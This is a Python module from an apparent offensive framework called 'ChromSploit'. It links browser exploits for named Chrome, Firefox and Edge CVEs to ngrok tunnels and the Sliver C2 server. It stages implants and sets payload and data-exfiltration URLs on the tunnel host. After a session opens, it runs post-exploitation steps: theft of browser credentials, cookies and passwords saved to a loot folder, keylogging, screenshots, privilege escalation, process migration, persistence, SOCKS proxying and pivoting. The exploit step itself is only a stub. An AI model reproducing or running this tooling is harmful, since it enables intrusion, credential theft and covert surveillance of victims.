#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
CVE Exploit Integrations with Sliver C2 Support

This module provides integration between CVE exploits, ngrok tunnels,
and Sliver C2 for advanced post-exploitation capabilities.
"""

from typing import Dict, Any, Optional, List, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse
import os
import json

from core.enhanced_logger import get_logger
from core.ngrok_manager import get_ngrok_manager, register_cve_integration
from core.sliver_c2.sliver_manager import SliverServerManager, SliverConfig
from core.sliver_c2.implant_manager import ImplantManager, ImplantConfig
from core.sliver_c2.session_handler import SessionHandler
from core.sliver_c2.post_exploitation import PostExploitation


@dataclass
class CVEExploitWithSliverConfig:
    """Configuration for CVE exploits with Sliver C2 integration"""
    cve_id: str
    target_url: Optional[str] = None
    local_port: int = 8080
    tunnel_url: Optional[str] = None
    exploit_parameters: Dict[str, Any] = field(default_factory=dict)
    external_mode: bool = False
    
    # Sliver C2 configuration
    sliver_enabled: bool = True
    sliver_implant_id: Optional[str] = None
    sliver_session_id: Optional[str] = None
    sliver_implant_config: Optional[ImplantConfig] = None
    post_exploit_actions: List[str] = field(default_factory=list)
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update configuration from tunnel data"""
        if tunnel_data.get('public_url'):
            self.tunnel_url = tunnel_data['public_url']
            self.target_url = tunnel_data['public_url']
            self.local_port = tunnel_data.get('port', self.local_port)
            self.external_mode = True
            
            # Update exploit-specific parameters
            parsed_url = urlparse(self.tunnel_url)
            self.exploit_parameters.update({
                'callback_host': parsed_url.hostname,
                'callback_port': parsed_url.port or (443 if parsed_url.scheme == 'https' else 80),
                'callback_url': self.tunnel_url,
                'external_url': self.tunnel_url
            })


class CVE2025_4664_SliverConfig(CVEExploitWithSliverConfig):
    """Configuration for CVE-2025-4664 (Chrome Data Leak) with Sliver C2"""
    
    def __init__(self):
        super().__init__(cve_id="CVE-2025-4664")
        self.exploit_parameters = {
            'link_header_size': 8192,
            'memory_leak_size': 1024,
            'chunk_size': 256,
            'leak_attempts': 5
        }
        self.post_exploit_actions = [
            "collect_browser_data",
            "extract_chrome_passwords",
            "capture_screenshots",
            "establish_persistence"
        ]
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update CVE-2025-4664 specific configuration"""
        super().update_from_tunnel(tunnel_data)
        
        # CVE-specific parameters
        if self.tunnel_url:
            self.exploit_parameters.update({
                'malicious_server': self.tunnel_url,
                'link_header_url': f"{self.tunnel_url}/leak-endpoint",
                'data_exfil_url': f"{self.tunnel_url}/collect-data",
                'sliver_payload_url': f"{self.tunnel_url}/sliver-payload"
            })


class CVE2025_2783_SliverConfig(CVEExploitWithSliverConfig):
    """Configuration for CVE-2025-2783 (Chrome Mojo Sandbox Escape) with Sliver C2"""
    
    def __init__(self):
        super().__init__(cve_id="CVE-2025-2783")
        self.exploit_parameters = {
            'mojo_interface': 'NodeController',
            'handle_count': 1024,
            'validation_bypass': True,
            'sandbox_escape': True
        }
        self.post_exploit_actions = [
            "privilege_escalation",
            "migrate_process",
            "establish_persistence",
            "collect_browser_data"
        ]
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update CVE-2025-2783 specific configuration"""
        super().update_from_tunnel(tunnel_data)
        
        if self.tunnel_url:
            self.exploit_parameters.update({
                'c2_server': self.tunnel_url,
                'payload_url': f"{self.tunnel_url}/mojo-payload",
                'shell_callback': f"{self.tunnel_url}/shell",
                'sliver_staging_url': f"{self.tunnel_url}/sliver-stage"
            })


class CVE2025_2857_SliverConfig(CVEExploitWithSliverConfig):
    """Configuration for CVE-2025-2857 (Firefox Sandbox Escape) with Sliver C2"""
    
    def __init__(self):
        super().__init__(cve_id="CVE-2025-2857")
        self.exploit_parameters = {
            'ipdl_interface': 'PContent',
            'handle_confusion': True,
            'privilege_escalation': True
        }
        self.post_exploit_actions = [
            "privilege_escalation",
            "collect_browser_data",
            "keylog_browser",
            "establish_persistence"
        ]
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update CVE-2025-2857 specific configuration"""
        super().update_from_tunnel(tunnel_data)
        
        if self.tunnel_url:
            self.exploit_parameters.update({
                'exploit_server': self.tunnel_url,
                'ipdl_payload_url': f"{self.tunnel_url}/firefox-payload",
                'escalation_callback': f"{self.tunnel_url}/escalate",
                'sliver_beacon_url': f"{self.tunnel_url}/sliver-beacon"
            })


class CVE2025_30397_SliverConfig(CVEExploitWithSliverConfig):
    """Configuration for CVE-2025-30397 (Edge WebAssembly JIT Escape) with Sliver C2"""
    
    def __init__(self):
        super().__init__(cve_id="CVE-2025-30397")
        self.exploit_parameters = {
            'wasm_module_size': 4096,
            'jit_spray_count': 1000,
            'heap_corruption': True,
            'code_execution': True
        }
        self.post_exploit_actions = [
            "collect_browser_data",
            "establish_persistence",
            "socks5_proxy",
            "pivot_listener"
        ]
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update CVE-2025-30397 specific configuration"""
        super().update_from_tunnel(tunnel_data)
        
        if self.tunnel_url:
            self.exploit_parameters.update({
                'wasm_server': self.tunnel_url,
                'malicious_wasm_url': f"{self.tunnel_url}/malicious.wasm",
                'jit_payload_url': f"{self.tunnel_url}/jit-payload",
                'sliver_implant_url': f"{self.tunnel_url}/sliver-implant"
            })


class CVEIntegrationWithSliverManager:
    """Manages CVE exploit integrations with Sliver C2"""
    
    def __init__(self):
        self.logger = get_logger()
        self.ngrok_manager = get_ngrok_manager()
        
        # Initialize Sliver C2 components
        self.sliver_config = SliverConfig()
        self.sliver_server = SliverServerManager(self.sliver_config)
        self.implant_manager = ImplantManager(self.sliver_server)
        self.session_handler = SessionHandler(self.sliver_server)
        self.post_exploitation = PostExploitation(self.session_handler)
        
        # Initialize CVE configurations
        self.cve_configs = {
            'CVE-2025-4664': CVE2025_4664_SliverConfig(),
            'CVE-2025-2783': CVE2025_2783_SliverConfig(),
            'CVE-2025-2857': CVE2025_2857_SliverConfig(),
            'CVE-2025-30397': CVE2025_30397_SliverConfig()
        }
        
        # Register update handlers
        self._register_handlers()
        
        # Start Sliver server if not running
        self._ensure_sliver_server()
        
        self.logger.info("CVE integration with Sliver C2 manager initialized")
    
    def _ensure_sliver_server(self):
        """Ensure Sliver server is running"""
        if not self.sliver_server._is_server_running():
            self.logger.info("Starting Sliver C2 server...")
            if self.sliver_server.start_server():
                if self.sliver_server.connect():
                    self.session_handler.start_monitoring()
                    self.logger.info("Sliver C2 server started and connected")
                else:
                    self.logger.error("Failed to connect to Sliver server")
            else:
                self.logger.error("Failed to start Sliver server")
    
    def _register_handlers(self):
        """Register CVE update handlers with ngrok manager"""
        for cve_id, config in self.cve_configs.items():
            register_cve_integration(cve_id, self._create_update_handler(cve_id))
            self.logger.debug(f"Registered handler for {cve_id}")
    
    def _create_update_handler(self, cve_id: str):
        """Create update handler for specific CVE"""
        def update_handler(tunnel_data: Dict[str, Any]):
            if cve_id in self.cve_configs:
                config = self.cve_configs[cve_id]
                config.update_from_tunnel(tunnel_data)
                self.logger.info(f"Updated {cve_id} configuration with tunnel: {tunnel_data.get('public_url')}")
                
                # Generate Sliver implant for this CVE if enabled
                if config.sliver_enabled and config.tunnel_url:
                    self._generate_cve_implant(cve_id)
        
        return update_handler
    
    def _generate_cve_implant(self, cve_id: str):
        """Generate Sliver implant for specific CVE"""
        config = self.cve_configs.get(cve_id)
        if not config:
            return
            
        # Generate implant
        implant = self.implant_manager.generate_cve_implant(
            cve_id=cve_id,
            target_os="windows"  # Default, can be customized
        )
        
        if implant:
            config.sliver_implant_id = implant.id
            config.sliver_implant_config = implant.config
            
            # Stage implant at tunnel URL
            if config.tunnel_url:
                staged_url = self.implant_manager.stage_implant(
                    implant.id,
                    config.tunnel_url
                )
                if staged_url:
                    self.logger.info(f"Staged Sliver implant for {cve_id} at: {staged_url}")
    
    def execute_cve_exploit_with_sliver(self, cve_id: str, target: str) -> Tuple[bool, str]:
        """Execute CVE exploit with Sliver C2 integration"""
        config = self.cve_configs.get(cve_id)
        if not config:
            return False, f"CVE {cve_id} not found"
            
        try:
            # 1. Prepare Sliver implant if not already done
            if config.sliver_enabled and not config.sliver_implant_id:
                self._generate_cve_implant(cve_id)
                
            # 2. Execute the exploit (simplified - would call actual exploit code)
            self.logger.info(f"Executing {cve_id} exploit against {target}")
            
            # 3. Wait for Sliver callback
            if config.sliver_enabled:
                # Register callback handler
                def new_session_callback(session_info):
                    if session_info.implant_id == config.sliver_implant_id:
                        config.sliver_session_id = session_info.session_id
                        self.logger.info(f"Received Sliver session for {cve_id}: {session_info.session_id}")
                        
                        # Execute post-exploitation actions
                        self._execute_post_exploitation(cve_id, session_info.session_id)
                
                self.session_handler.register_callback("new_session", new_session_callback)
            
            return True, f"Exploit {cve_id} executed successfully"
            
        except Exception as e:
            return False, str(e)
    
    def _execute_post_exploitation(self, cve_id: str, session_id: str):
        """Execute post-exploitation actions for CVE"""
        config = self.cve_configs.get(cve_id)
        if not config:
            return
            
        self.logger.info(f"Executing post-exploitation for {cve_id}")
        
        for action in config.post_exploit_actions:
            try:
                if action == "collect_browser_data":
                    browser_data = self.post_exploitation.collect_browser_data(session_id)
                    if browser_data:
                        self._save_browser_data(cve_id, session_id, browser_data)
                        
                elif action == "extract_chrome_passwords":
                    passwords = self.post_exploitation.extract_chrome_passwords(session_id)
                    if passwords:
                        self._save_passwords(cve_id, session_id, passwords)
                        
                elif action == "capture_screenshots":
                    screenshots = self.post_exploitation.capture_browser_screenshots(
                        session_id, interval=30, count=5
                    )
                    self.logger.info(f"Captured {len(screenshots)} screenshots")
                    
                elif action == "establish_persistence":
                    success, msg = self.post_exploitation.establish_persistence(
                        session_id, method="chrome_extension"
                    )
                    self.logger.info(f"Persistence result: {msg}")
                    
                elif action == "privilege_escalation":
                    # Attempt privilege escalation
                    result = self.session_handler.execute_command_sync(
                        session_id, "getsystem"
                    )
                    self.logger.info(f"Privilege escalation: {result.success}")
                    
                elif action == "migrate_process":
                    # Get browser process and migrate
                    ps_result = self.session_handler.get_processes(session_id)
                    if ps_result.success:
                        # Find Chrome/Firefox/Edge process
                        for line in ps_result.output.split('\n'):
                            if any(browser in line.lower() for browser in ['chrome', 'firefox', 'edge']):
                                pid = int(line.split()[0])  # Assuming PID is first column
                                migrate_result = self.session_handler.migrate_process(session_id, pid)
                                if migrate_result.success:
                                    self.logger.info(f"Migrated to browser process {pid}")
                                break
                                
                elif action == "keylog_browser":
                    success, msg = self.post_exploitation.keylog_browser(session_id, duration=300)
                    self.logger.info(f"Keylogging started: {msg}")
                    
                elif action == "socks5_proxy":
                    result = self.session_handler.socks5_proxy(session_id, 9050)
                    self.logger.info(f"SOCKS5 proxy: {result.success}")
                    
                elif action == "pivot_listener":
                    result = self.session_handler.pivot_listener(session_id, "0.0.0.0", 8443)
                    self.logger.info(f"Pivot listener: {result.success}")
                    
            except Exception as e:
                self.logger.error(f"Error executing {action}: {e}")
    
    def _save_browser_data(self, cve_id: str, session_id: str, browser_data):
        """Save collected browser data"""
        output_dir = f"/tmp/chromsploit_loot/{cve_id}/{session_id}"
        os.makedirs(output_dir, exist_ok=True)
        
        # Save credentials
        if browser_data.credentials:
            with open(f"{output_dir}/credentials.json", 'w') as f:
                json.dump([
                    {
                        'url': cred.url,
                        'username': cred.username,
                        'password': cred.password
                    }
                    for cred in browser_data.credentials
                ], f, indent=2)
                
        # Save cookies
        if browser_data.cookies:
            with open(f"{output_dir}/cookies.json", 'w') as f:
                json.dump([
                    {
                        'domain': cookie.domain,
                        'name': cookie.name,
                        'value': cookie.value,
                        'path': cookie.path
                    }
                    for cookie in browser_data.cookies
                ], f, indent=2)
                
        self.logger.info(f"Browser data saved to {output_dir}")
    
    def _save_passwords(self, cve_id: str, session_id: str, passwords: List[Dict]):
        """Save extracted passwords"""
        output_dir = f"/tmp/chromsploit_loot/{cve_id}/{session_id}"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(f"{output_dir}/passwords.json", 'w') as f:
            json.dump(passwords, f, indent=2)
            
        self.logger.info(f"Saved {len(passwords)} passwords")
    
    def get_cve_config(self, cve_id: str) -> Optional[CVEExploitWithSliverConfig]:
        """Get configuration for specific CVE"""
        return self.cve_configs.get(cve_id)
    
    def get_active_sessions(self) -> List[Dict]:
        """Get active Sliver sessions"""
        sessions = []
        for session_info in self.session_handler.list_sessions():
            # Find associated CVE
            associated_cve = None
            for cve_id, config in self.cve_configs.items():
                if config.sliver_session_id == session_info.session_id:
                    associated_cve = cve_id
                    break
                    
            sessions.append({
                'session_id': session_info.session_id,
                'hostname': session_info.hostname,
                'username': session_info.username,
                'os': session_info.os,
                'last_checkin': session_info.last_checkin.isoformat(),
                'associated_cve': associated_cve
            })
            
        return sessions
    
    def interact_with_session(self, session_id: str) -> Tuple[bool, str]:
        """Start interactive session with Sliver"""
        return self.session_handler.interact_with_session(session_id)
    
    def export_sliver_status(self) -> Dict[str, Any]:
        """Export Sliver C2 status"""
        return {
            'server_running': self.sliver_server._is_server_running(),
            'connected': self.sliver_server.connected,
            'active_sessions': len(self.session_handler.list_sessions()),
            'implants_generated': len(self.implant_manager.list_implants()),
            'monitoring_active': self.session_handler.monitoring
        }


# Global instance
_cve_sliver_manager = None

def get_cve_sliver_manager() -> CVEIntegrationWithSliverManager:
    """Get or create CVE Sliver integration manager instance"""
    global _cve_sliver_manager
    if _cve_sliver_manager is None:
        _cve_sliver_manager = CVEIntegrationWithSliverManager()
    return _cve_sliver_manager


# Convenience functions for exploit modules
def execute_cve_with_sliver(cve_id: str, target: str) -> Tuple[bool, str]:
    """Execute CVE exploit with Sliver C2 support"""
    manager = get_cve_sliver_manager()
    return manager.execute_cve_exploit_with_sliver(cve_id, target)


def get_sliver_sessions() -> List[Dict]:
    """Get active Sliver sessions"""
    manager = get_cve_sliver_manager()
    return manager.get_active_sessions()


def interact_with_sliver_session(session_id: str) -> Tuple[bool, str]:
    """Interact with Sliver session"""
    manager = get_cve_sliver_manager()
    return manager.interact_with_session(session_id)